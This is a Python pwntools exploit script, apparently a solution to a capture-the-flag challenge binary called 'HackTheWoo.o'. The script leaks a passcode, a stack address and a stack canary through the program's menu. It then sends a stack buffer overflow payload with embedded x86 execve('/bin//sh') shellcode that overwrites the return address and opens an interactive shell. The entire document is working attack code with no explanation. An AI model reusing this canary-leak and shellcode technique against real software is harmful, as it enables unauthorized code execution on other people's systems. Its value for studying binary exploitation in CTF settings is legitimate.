from pwn import *

context.log_level = 'debug'

r = process('HackTheWoo.o')
#r = remote('221.149.226.120', 31338)

# main printf
r.recvuntil(b'\n\n')

def select_option(num):
    r.recvuntil(b'application\n')
    r.sendline(str(num).encode())


# input_operation
select_option(1)
r.recvuntil(b'[student number]\n')
r.sendline(b'1234')
r.recvuntil(b'[name]\n')
r.send(b'a'*40)
r.recvuntil(b'[grade]\n')
r.send(b'b'*5)


#print_info
select_option(2)
r.recvuntil(b'a'*40)
passcode = r.recvuntil(b'\n')[0:4]
r.recvuntil(b'\n')


# input_operation
select_option(1)
r.recvuntil(b'[student number]\n')
r.sendline(b'2018131321')
r.recvuntil(b'[name]\n')
r.send(b'hyunwoo')
r.recvuntil(b'[grade]\n')
r.send(b'A+')
r.recvuntil(b'passcode:\n')
r.send(passcode)

# graduate_school_application
select_option(3)
r.recvuntil(b'name\n')
temp = b'a'*40 + passcode
temp += b'a'*4
r.send(temp)
r.recvuntil(b'you.\n')
stack = r.recvuntil(b'\n')[:-1]
stack = int(stack, 16)

# print_info
select_option(2)
r.recvuntil(b'b'*3)
canary = r.recvuntil(b'\n')[0:3]
canary = u32(b'\x00'+canary)


# graduate_school_application
select_option(3)
r.recvuntil(b'name\n')
shellcode = b"\x31\xc0\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x31\xc9\x31\xd2\xb0\x08\x40\x40\x40\xcd\x80"
ex = shellcode + b'a' * (40-len(shellcode))
ex += passcode
ex += b'a'*4
ex += b'A+aa'
ex += p32(canary)
ex += b'a'*4
ex += p32(stack)
r.send(ex)


for i in range(6, 10):
    select_option(i)


r.interactive()